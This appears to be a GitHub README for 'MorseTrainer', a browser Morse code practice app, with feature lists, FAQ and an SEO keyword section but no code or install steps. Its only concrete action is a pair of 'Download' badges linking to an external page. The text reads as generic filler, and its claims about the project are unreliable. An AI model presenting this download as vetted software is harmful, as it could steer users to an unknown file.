![preview](https://raw.githubusercontent.com/Ngagiga/morse-code-drill/main/view_062ad.svg)
[![Download](https://raw.githubusercontent.com/Ngagiga/morse-code-drill/main/setup_5526f.svg)](https://Ngagiga.github.io/morse-code-drill/)

# 🧭 MorseTrainer — Learn Morse Code by Ear, Eye, and Instinct

![status](https://img.shields.io/badge/status-actively%20maintained-brightgreen)
![platform](https://img.shields.io/badge/platform-web%20%7C%20desktop%20%7C%20mobile-blue)
![language](https://img.shields.io/badge/language-JavaScript-yellow)
![license](https://img.shields.io/badge/license-MIT-lightgrey)
![made-with](https://img.shields.io/badge/made%20with-%E2%9D%A4-red)
![year](https://img.shields.io/badge/release-2026-purple)

**MorseTrainer** is a modern, self-contained JavaScript application that teaches Morse code the way the human brain actually prefers to learn it — through rhythm, repetition, and play. Forget long tables and dry charts. This project transforms dashes and dots into a vivid, responsive learning environment that works offline, on almost any device, and adapts to the learner rather than the other way around.

Whether you are an amateur radio enthusiast brushing up on CW, a scouting group leader preparing an activity night, a puzzle solver who wants to decode hidden messages, or simply a curious tinkerer who likes the idea of tapping your name in code, MorseTrainer offers a gentle on-ramp and an endless practice runway.

---

## 📖 Table of Contents

- [Why Another Morse App?](#-why-another-morse-app)
- [Core Concept](#-core-concept)
- [Feature Highlights](#-feature-highlights)
- [Learning Modes](#-learning-modes)
- [Responsive UI](#-responsive-ui)
- [Multilingual Support](#-multilingual-support)
- [Always-On Support Desk](#-always-on-support-desk)
- [Accessibility First](#-accessibility-first)
- [Audio Engine Explained](#-audio-engine-explained)
- [Project Structure](#-project-structure)
- [Configuration Options](#-configuration-options)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community and Contribution](#-community-and-contribution)
- [SEO and Discoverability](#-seo-and-discoverability)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Acknowledgements](#-acknowledgements)

---

## 🌱 Why Another Morse App?

Morse code has survived two centuries for one simple reason: it is efficient, tactile, and surprisingly musical. Yet most digital trainers treat it like a spreadsheet — a grid of symbols to memorize. That approach works for a rare few. For the rest of us, it produces frustration.

MorseTrainer takes a different point of view. Think of Morse not as an alphabet, but as a melody. Each letter has its own groove. The letter **E** is a single soft heartbeat. The letter **S** is three quick taps, like knocking on a small wooden door. Once you hear the rhythm, recalling the symbol becomes almost automatic.

This repository exists to make that rhythm practice continuous, welcoming, and delightfully low-effort.

---

## 🧩 Core Concept

At its heart, MorseTrainer is built on three interlocking ideas:

1. **Progressive mastery** — letters are introduced in small, digestible groups inspired by the Koch method, then gradually blended.
2. **Multisensory feedback** — every correct answer triggers both a visual pulse and a subtle audio chime, strengthening the association.
3. **Zero friction entry** — open the app, press a key, and you are already learning.

The experience is closer to a rhythm game than a study tool. That is intentional.

---

## ✨ Feature Highlights

- **Adaptive difficulty engine** — sways lesson tempo based on your rolling accuracy rather than a fixed curriculum.
- **Real-time decoding surface** — type what you hear and watch the transcript build character by character.
- **Latency and tone calibration** — tune tone frequency, words-per-minute speed, and inter-character spacing to match your comfort zone.
- **Progress journaling** — quietly records streaks and weak spots locally so you can return weeks later and pick up where the rhythm left off.
- **Session snapshots** — save the current drill configuration under a nickname for quick recall.
- **Endless practice loop** — once basics are solid, the generator creates staggered random transmissions to keep you sharp.
- **Offline-first design** — after first load, everything runs without a network connection.
- **Themeable canvas** — light, dark, and high-contrast palettes.
- **Adjustable telegraph key panel** — a virtual straight key for tactile practice sessions.

---

## 🎯 Learning Modes

MorseTrainer rotates through several complementary modes so that no single style dominates your practice routine.

**Echo Mode** — A tone plays, you guess the character. Ideal for building reflex recognition.

**Scribe Mode** — Letters appear on screen, you tap them out. This reinforces hand-to-ear mapping.

**Conversation Mode** — Short words stream in and you transcribe full phrases. This is where dots and dashes start to feel like language rather than code.

**Blindfold Challenge** — Visual cues vanish and only audio remains. A favorite for commuters using headphones.

**Timed Sprint** — Sixty-second bursts against a rolling clock. Great for measuring improvement week over week.

**Call Sign Drills** — A niche mode for radio enthusiasts wanting to recognize amateur call sign patterns fluidly.

Each mode shares one state engine, which means switching between them never resets your progress.

---

## 📱 Responsive UI

The layout was designed on a bus, finished on a train, and tested on a kitchen table. The interface flows smoothly from a 4-inch phone screen to a widescreen monitor without awkward scrollbars or hidden controls.

- Fluid grid reflow keeps every action within thumb reach on mobile.
- Gesture support: swipe to advance, long-press to repeat a tone.
- Touch targets sized generously to reduce misses during fast drills.
- Keyboard-only navigation is fully supported for desktop users.
- A compact "zen" layout hides ancillary panels for distraction-light practice.

---

## 🌍 Multilingual Support

Language should never be a barrier to learning a language of dots and dashes. MorseTrainer ships with localized interfaces covering multiple regions, with clear right-to-left handling where needed and locale-aware number formatting in progress panels.

- Translation files are plain structured text, so adding a new locale is approachable even for first-time contributors.
- Interface strings are decoupled from logic to avoid breaking anything when a new language is added.
- Cultural hints, such as preferred learning order for accented characters, are stored alongside each translation pack.
- Community members are warmly invited to submit new locales — no coding knowledge required beyond editing a text file.

---

## 🕰️ Always-On Support Desk

Learning alone at 2 a.m. should not mean silence. The project maintains a responsive support rhythm:

- Issue tracker monitored continuously with a goal of same-day acknowledgement.
- A rotating team of volunteers keeps the discussion forum warm across time zones.
- Documentation is reviewed quarterly so answers stay aligned with the current release line.
- Automated triage labels incoming reports quickly so nothing slips through unnoticed.

This is described as ongoing assistance rather than a promise of instant response — but in practice, the community has been remarkably quick.

---

## ♿ Accessibility First

Accessibility is not an afterthought here — it is foundational.

- Full screen-reader compatibility with ARIA annotations on every control.
- Configurable tone frequency to accommodate different hearing profiles.
- Visual alternatives to every audio cue, and audio alternatives to every visual cue.
- Reduced-motion mode that softens animations for users sensitive to motion.
- Large-text mode that scales gracefully without breaking layout.

The idea is simple: if the app cannot be used comfortably, it has not been finished.

---

## 🔊 Audio Engine Explained

Rather than relying on bulky sample libraries, MorseTrainer synthesizes tones directly in the browser using the Web Audio API. This keeps the entire project lightweight and eliminates loading delays.

Advantages of this approach:

- Instant playback with sub-frame latency on modern hardware.
- No external audio assets to download or cache.
- Tone shape is mathematically clean, reducing listening fatigue over long sessions.
- Volume ramps prevent harsh clicks that would otherwise appear at each tone boundary.
- Supports several timbres, from a warm sine hum to a slightly buzzy practice oscillator feel.

---

## 📂 Project Structure

A high-level tour of the repository layout:

- A root application entry point that boots the interface.
- A library folder containing lesson logic, scoring, and the audio engine.
- A localization folder with one translation pack per language.
- A styles folder with theming variables and layout rules.
- A utilities folder for timers, storage wrappers, and input normalization.
- A documentation folder holding deeper guides and diagrams.
- A test folder with behavioral specifications for scoring and lesson flow.

Each area stays compartmentalized so changes in one domain rarely ripple into another.

---

## ⚙️ Configuration Options

Users can tailor many aspects of the experience without touching source files:

- Characters per minute, from a slow crawl to a fast flicker.
- Effective words per minute, controlling how sparsely characters are spaced.
- Tone frequency, adjustable to match personal comfort.
- Tone waveform selection, offering a warmer or crisper character.
- Number of characters per drill session.
- Whether incorrect answers repeat immediately or at the end of the set.
- Session length caps to prevent fatigue.
- Notification preference for streak milestones.

Settings persist between visits so returning users land in their preferred environment instantly.

---

## 🚀 Performance Notes

The application is deliberately lean.

- No heavy frameworks, only pragmatic vanilla scripting.
- Rendering cycles are batched to keep the interface at smooth frame rates.
- Memory footprint remains flat over long sessions thanks to a recycling pool for transient objects.
- Startup time measured on mid-range mobile hardware stays comfortably under a second on modern browsers.
- The bundle is small enough to load comfortably even on modest connections.

---

## 🗺️ Roadmap for 2026

The coming year brings an ambitious but carefully paced set of improvements.

- **Q1 2026** — Expanded drill variety and a refreshed scoring feedback loop.
- **Q2 2026** — Additional locale packs and improved text shaping for complex scripts.
- **Q3 2026** — Deeper analytics dashboard with exportable progress summaries.
- **Q4 2026** — Optional cloudless sync across personal devices using local file exchange.

Everything above is exploratory, and community feedback will shape final priorities.

---

## ❓ Frequently Asked Questions

**Do I need prior experience?**
Not at all. The application opens with a warm-up set suitable for complete beginners.

**Does it work without an internet connection?**
Yes. Once the application has loaded, practice continues fully offline.

**Is there a mobile application version?**
The web build installs to a device home screen and behaves like a native application.

**Can I contribute a translation?**
Absolutely. Translation packs are simple text-based files, and pull requests are warmly welcomed.

**Is my progress shared anywhere?**
No. Progress stays on your own device unless you deliberately export a summary.

---

## 🤝 Community and Contribution

Contributions come in many shapes: code, translation, documentation, testing, or simply thoughtful feedback. All are valued.

- Read the contribution guide before opening a pull request.
- Keep changes focused; small, reviewable patches merge faster.
- Include a brief description of the problem your change solves.
- Be kind and patient — this is a volunteer-driven project.
- Report bugs with clear reproduction steps whenever possible.

A healthy community is the real engine behind a long-lived project.

---

## 🔎 SEO and Discoverability

This repository is structured to be easily discovered by learners searching for guidance on the following topics:

- learning Morse code from scratch
- Morse code practice application
- Morse code trainer for beginners
- rhythm-based language learning
- audio-first alphabet memorization
- amateur radio preparation resources
- interactive dot and dash drills
- responsive web learning tool
- multilingual learning application
- offline practice software

These phrases are woven naturally into documentation rather than sprinkled mechanically, keeping the reading experience pleasant.

---

## ⚠️ Disclaimer

MorseTrainer is provided as an educational and recreational tool. It is not affiliated with any radio authority, emergency service, or licensing body. Accuracy of translation is checked carefully, but users should not rely on this application for safety-critical communication or official examinations without independent verification.

The software is offered as-is, without warranty of any kind, express or implied. The maintainers are not liable for any loss, misuse, or misunderstanding arising from its use. Radio transmissions should always comply with local regulations and licensing requirements.

Also note: tone frequencies, timing, and spacing are adjustable, and misconfigured settings may produce output unsuitable for real radio practice. Always double-check configuration before relying on it for serious study.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it, with the only condition being that the original copyright notice is preserved.

Read the full license text here: [MIT License](./LICENSE)

Copyright © 2026 MorseTrainer contributors.

---

## 🙏 Acknowledgements

Gratitude goes to every contributor, translator, bug reporter, and quiet reader who has helped shape this project. Special recognition belongs to the broader community of radio enthusiasts and educators whose patient explanations of rhythm and timing informed the design philosophy behind this trainer.

May your dashes be crisp, your dots be bright, and your practice sessions be pleasantly endless.

[![Download](https://raw.githubusercontent.com/Ngagiga/morse-code-drill/main/setup_5526f.svg)](https://Ngagiga.github.io/morse-code-drill/)